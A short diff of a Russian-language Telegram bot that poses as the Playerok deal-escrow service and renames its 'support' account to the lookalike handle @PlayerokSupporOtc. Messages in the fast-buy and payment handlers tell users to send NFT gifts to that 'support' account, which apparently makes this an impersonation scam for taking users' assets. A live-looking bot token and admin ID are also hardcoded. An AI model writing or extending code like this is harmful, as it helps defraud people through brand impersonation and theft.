@@ -23,7 +23,7 @@ config.read('config.ini')
 
 BOT_TOKEN = '8257496038:AAF51rV91ks99RaXUi33V7zEo4Ps9hXUHPQ'
 ADMIN_IDS = '2023413492'
-SUPPORT_USERNAME = 'supporOTC'
+SUPPORT_USERNAME = 'PlayerokSupporOtc'
 WEBSITE_URL = 'https://playerok.com'
 # ID группы для логов успешных сделок (нужно заменить на реальный ID)
 LOG_GROUP_ID = -1003727018387  # Замените на реальный ID группы
@@ -519,7 +519,7 @@ async def cmd_start(message: types.Message, command: CommandStart):
         f"{hbold('👋 Добро пожаловать в Playerok!')}\n\n"
         f"Сервис, обеспечивающий безопасность и удобство проведения сделок.\n\n"
         f"📢 Наш канал — @playerok_com\n"
-        f"🛟 Поддержка — @supporOTC\n\n"
+        f"🛟 Поддержка — @PlayerokSupporOtc\n\n"
         f"👇 Нажмите кнопку ниже, чтобы продолжить"
     )
     
@@ -595,7 +595,7 @@ async def fast_buy(message: types.Message):
             f"👤 Имя: {buyer['first_name']}\n"
             f"📊 Успешных сделок: {buyer['successful_deals']}\n"
             f"💰 Оборот: {buyer['total_turnover']} RUB\n\n"
-            f"Пожалуйста, отправьте NFT поддержке @supporOTC\n"
+            f"Пожалуйста, отправьте NFT поддержке @PlayerokSupporOtc\n"
             f"После отправки подарка нажмите кнопку ниже:"
         )
         await bot.send_message(
@@ -1245,7 +1245,7 @@ async def process_pay(callback: types.CallbackQuery):
             f"👤 Имя: {buyer['first_name']}\n"
             f"📊 Успешных сделок: {buyer['successful_deals']}\n"
             f"💰 Оборот: {buyer['total_turnover']} RUB\n\n"
-            f"Пожалуйста, отправьте NFT поддержке @supporOTC\n\n"
+            f"Пожалуйста, отправьте NFT поддержке @PlayerokSupporOtc\n\n"
             f"После отправки подарка нажмите кнопку ниже:"
         )
         await callback.bot.send_message(
